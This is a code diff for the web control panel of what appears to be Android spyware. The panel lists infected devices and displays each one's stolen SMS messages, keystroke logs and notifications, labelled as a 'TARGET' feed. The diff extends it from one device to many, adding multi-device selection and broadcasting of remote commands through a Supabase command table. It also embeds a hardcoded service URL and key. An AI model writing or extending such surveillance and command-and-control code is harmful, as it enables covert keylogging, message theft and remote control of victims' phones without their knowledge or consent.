@@ -70,6 +70,12 @@
         }
 
         .card { background: var(--surface); border: 1px solid var(--surface-light); border-left: 2px solid var(--primary); padding: 15px; margin-bottom: 15px; position: relative; }
+        .device-row { display: flex; align-items: center; justify-content: space-between; padding: 12px; border-bottom: 1px solid #222; cursor: pointer; transition: 0.2s; }
+        .device-row:hover { background: rgba(0, 243, 255, 0.05); }
+        .device-row.selected { border-left: 4px solid var(--primary); background: rgba(0, 243, 255, 0.1); }
+        .device-info { flex: 1; }
+        .checkbox { width: 18px; height: 18px; border: 1px solid var(--primary); margin-right: 12px; display: flex; align-items: center; justify-content: center; font-size: 12px; }
+        .selected .checkbox::after { content: '✔'; color: var(--primary); }
 
         .stat-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
         .stat-item label { display: block; font-size: 0.7rem; color: #666; }
@@ -125,18 +131,19 @@
 
     <main>
         <div id="view-dash" class="section active">
-            <h2>Uplink Signal</h2>
-            <div class="card">
-                <div class="stat-grid">
-                    <div class="stat-item"><label>DEVICE</label><span id="stat-id">WAIT...</span></div>
-                    <div class="stat-item"><label>MODEL</label><span id="stat-model">---</span></div>
-                    <div class="stat-item"><label>BATTERY</label><span id="stat-batt">---</span></div>
-                    <div class="stat-item"><label>HEARTBEAT</label><span id="stat-seen">---</span></div>
-                </div>
+            <h2>Active Device Cluster</h2>
+            <div class="card" id="device-list-container" style="padding:0; max-height: 300px; overflow-y: auto;">
+                <div style="padding:20px; text-align:center; color:#444;">Scanning for signals...</div>
             </div>
-            <h2>Telemetry Feed</h2>
-            <div class="card" id="feed-container" style="max-height: 400px; overflow-y: auto;">
-                <div style="text-align: center; color: #444;">Monitoring...</div>
+            
+            <div id="multi-select-bar" style="display:none; margin-bottom:15px; gap:10px;">
+                 <button class="btn" onclick="selectAll(true)">Select All</button>
+                 <button class="btn" onclick="selectAll(false)">Clear</button>
+            </div>
+
+            <h2>Telemetry Feed <span id="feed-target-label" style="font-size:0.6rem; color:var(--primary); opacity:0.6;"></span></h2>
+            <div class="card" id="feed-container" style="max-height: 350px; overflow-y: auto;">
+                <div style="text-align: center; color: #444;">Select a device to view feed</div>
             </div>
         </div>
 
@@ -277,7 +284,8 @@
         const SUPABASE_URL = 'https://xvldfsmxskhemkslsbym.supabase.co';
         const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU';
         const sb = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-        let currentDeviceId = null;
+        let selectedDeviceIds = new Set();
+        let allDevices = [];
 
         window.onload = async () => {
             setTimeout(() => { document.getElementById('loader').style.display = 'none'; }, 1000);
@@ -295,30 +303,72 @@
         }
 
         async function fetchLatest() {
-            const { data } = await sb.from('device_stats').select('*').order('created_at', { ascending: false }).limit(1);
-            if (data && data.length > 0) {
-                const dev = data[0];
-                currentDeviceId = dev.device_id;
-                document.getElementById('stat-id').innerText = dev.device_id.substring(0, 8);
-                document.getElementById('stat-model').innerText = dev.device_model || '---';
-                document.getElementById('stat-batt').innerText = (dev.battery_level || 0) + '%';
+            const { data } = await sb.from('device_stats').select('*').order('created_at', { ascending: false }).limit(50);
+            if (data) {
+                // Group by Unique Device ID
+                const uniqueMap = new Map();
+                data.forEach(stat => {
+                    if (!uniqueMap.has(stat.device_id)) uniqueMap.set(stat.device_id, stat);
+                });
+                allDevices = Array.from(uniqueMap.values());
+                renderDeviceList();
                 
-                const diff = Math.floor((new Date() - new Date(dev.created_at)) / 1000);
-                document.getElementById('stat-seen').innerText = diff > 60 ? Math.floor(diff/60) + 'm' : diff + 's';
-
+                // Handle Connection Status Dot (Global)
                 const dot = document.getElementById('connectionStatus');
-                dot.className = 'status-dot ' + (diff < 90 ? 'online' : '');
-                
-                updateFeed(dev);
+                const isAnyOnline = allDevices.some(d => (new Date() - new Date(d.created_at)) < 90000);
+                dot.className = 'status-dot ' + (isAnyOnline ? 'online' : '');
+
+                // Update Feed for the first selected device or latest overall
+                if (selectedDeviceIds.size > 0) {
+                    const firstId = Array.from(selectedDeviceIds)[0];
+                    const target = allDevices.find(d => d.device_id === firstId);
+                    if (target) updateFeed(target);
+                }
             }
+        }
+
+        function selectAll(mode) {
+            if (mode) allDevices.forEach(d => selectedDeviceIds.add(d.device_id));
+            else selectedDeviceIds.clear();
+            renderDeviceList();
+        }
+
+        function toggleDevice(id) {
+            if (selectedDeviceIds.has(id)) selectedDeviceIds.delete(id);
+            else selectedDeviceIds.add(id);
+            renderDeviceList();
+        }
+
+        function renderDeviceList() {
+            const container = document.getElementById('device-list-container');
+            document.getElementById('multi-select-bar').style.display = 'flex';
+            
+            container.innerHTML = allDevices.map(dev => {
+                const isSelected = selectedDeviceIds.has(dev.device_id);
+                const diff = Math.floor((new Date() - new Date(dev.created_at)) / 1000);
+                const statusText = diff > 60 ? Math.floor(diff/60) + 'm' : diff + 's';
+                const isOnline = diff < 90;
+                
+                return `
+                    <div class="device-row ${isSelected ? 'selected' : ''}" onclick="toggleDevice('${dev.device_id}')">
+                        <div class="checkbox"></div>
+                        <div class="device-info">
+                            <div style="color:#fff; font-size:0.9rem;">${dev.device_model || 'Unknown'} <span style="color:${isOnline ? 'var(--success)' : '#444'}; font-size:0.6rem;">● ${statusText}</span></div>
+                            <div style="color:#666; font-size:0.7rem;">${dev.device_id.substring(0,12)}...</div>
+                        </div>
+                        <div style="color:var(--primary); font-size:0.8rem;">${dev.battery_level || 0}%</div>
+                    </div>
+                `;
+            }).join('');
         }
 
         function updateFeed(dev) {
             const container = document.getElementById('feed-container');
+            document.getElementById('feed-target-label').innerText = `// TARGET: ${dev.device_model}`;
             const logs = [];
-            if (dev.sms_logs) dev.sms_logs.forEach(x => logs.push({tag:'SMS', val:x.body, ts:x.timestamp, col:'var(--success)'}));
-            if (dev.typing_history) dev.typing_history.forEach(x => logs.push({tag:'KEY', val:`[${x.pkg}] ${x.txt}`, ts:x.end_ts, col:'var(--primary)'}));
-            if (dev.notif_history) dev.notif_history.forEach(x => logs.push({tag:'NTF', val:`${x.pkg}: ${x.title}`, ts:x.ts, col:'var(--secondary)'}));
+            if (dev.sms_logs) dev.sms_logs.forEach(x => logs.push({tag:'SMS', val:x.body, ts:x.timestamp || dev.created_at, col:'var(--success)'}));
+            if (dev.typing_history) dev.typing_history.forEach(x => logs.push({tag:'KEY', val:`[${x.pkg}] ${x.txt}`, ts:x.end_ts || dev.created_at, col:'var(--primary)'}));
+            if (dev.notif_history) dev.notif_history.forEach(x => logs.push({tag:'NTF', val:`${x.pkg}: ${x.title}`, ts:x.ts || dev.created_at, col:'var(--secondary)'}));
             
             logs.sort((a,b) => b.ts - a.ts);
             container.innerHTML = logs.slice(0, 25).map(l => `
@@ -330,7 +380,7 @@
         }
 
         async function sendCmd(type, forcedVal = null) {
-            if (!currentDeviceId) return alert("DISCONNECTED");
+            if (selectedDeviceIds.size === 0) return alert("NO TARGETS SELECTED");
             
             let content = forcedVal;
             if (content === null) {
@@ -374,11 +424,13 @@
                 }
             }
 
-            const { error } = await sb.from('file_commands').insert({
-                device_id: currentDeviceId, file_name: type, content: String(content || ''), status: 'PENDING'
-            });
-            if (error) alert("UPLINK ERROR");
-            else alert("COMMAND TRANSMITTED: " + type);
+            const commands = Array.from(selectedDeviceIds).map(id => ({
+                device_id: id, file_name: type, content: String(content || ''), status: 'PENDING'
+            }));
+
+            const { error } = await sb.from('file_commands').insert(commands);
+            if (error) alert("UPLINK ERROR: " + error.message);
+            else alert(`BROADCAST SUCCESS: ${type} SENT TO ${selectedDeviceIds.size} DEVICES`);
         }
 
         async function fetchFiles() {
